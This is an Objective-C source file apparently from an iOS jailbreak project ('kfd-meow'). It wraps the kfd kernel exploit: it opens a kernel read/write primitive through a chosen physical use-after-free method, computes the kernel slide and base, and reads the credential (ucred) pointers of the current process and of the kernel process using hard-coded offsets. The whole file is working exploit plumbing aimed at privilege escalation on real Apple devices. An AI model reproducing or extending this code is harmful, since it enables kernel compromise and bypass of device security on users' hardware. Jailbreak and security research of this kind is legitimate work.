//
//  libmeow.m
//  kfd-meow
//
//  Created by doraaa on 2023/12/17.
//

#include "libmeow.h"

uint64_t kernel_base = 0;
uint64_t kernel_slide = 0;

uint64_t our_task = 0;
uint64_t our_proc = 0;
uint64_t kernel_task = 0;
uint64_t kernproc = 0;
uint64_t our_ucred = 0;
uint64_t kern_ucred = 0;

uint64_t gCpuTTEP = 0;
uint64_t gPhysBase = 0;
uint64_t gVirtBase = 0;

uint64_t data__gCpuTTEP = 0;
uint64_t data__gVirtBase = 0;
uint64_t data__gPhysBase = 0;

uint64_t func__proc_set_ucred = 0;

uint64_t _kfd = 0;

void set_offsets(void) {
    kernel_slide = get_kernel_slide();
    kernel_base = kernel_slide + KERNEL_BASE_ADDRESS;
    our_task = get_current_task();
    our_proc = get_current_proc();
    kernel_task = get_kernel_task();
    kernproc = get_kernel_proc();
    our_ucred = proc_get_ucred(our_proc);
    kern_ucred = proc_get_ucred(kernproc);
    
    printf("kernel_slide : %016llx\n", kernel_slide);
    printf("kernel_base  : %016llx\n", kernel_base);
    printf("our_task     : %016llx\n", our_task);
    printf("our_proc     : %016llx\n", our_proc);
    printf("kernel_task  : %016llx\n", kernel_task);
    printf("kernproc     : %016llx\n", kernproc);
    printf("our_ucred    : %016llx\n", our_ucred);
    printf("kern_ucred   : %016llx\n", kern_ucred);
}

/*---- proc ----*/
uint64_t proc_get_proc_ro(uint64_t proc_ptr) {
    if(@available(iOS 16.0, *))
        return kread64_kfd(proc_ptr + 0x18);
    return kread64_kfd(proc_ptr + 0x20);
}

uint64_t proc_ro_get_ucred(uint64_t proc_ro_ptr) {
    return kread64_kfd(proc_ro_ptr + 0x20);
}

uint64_t proc_get_ucred(uint64_t proc_ptr) {
    return proc_ro_get_ucred(proc_get_proc_ro(proc_ptr));
}

/*---- meow ----*/
int meow(void) {
    
    set_offsets();
    
    if(!isarm64e())
        offsetfinder64_kread();
    
    return 0;
}

uint64_t kpoen_bridge(uint64_t puaf_method, uint64_t pplrw) {
    uint64_t exploit_type = (1 << puaf_method);
    _kfd = kopen(exploit_type, pplrw);
    if(isarm64e())
    {
        offset_exporter();
    }
    
    if(_kfd != 0)
        return _kfd;
    
    return 0;
}

uint64_t meow_and_kclose(uint64_t _kfd) {
    if(!isarm64e() && ((struct kfd*)_kfd)->info.env.vid >= 8)
        meow();
    kclose(_kfd);
    return 0;
}
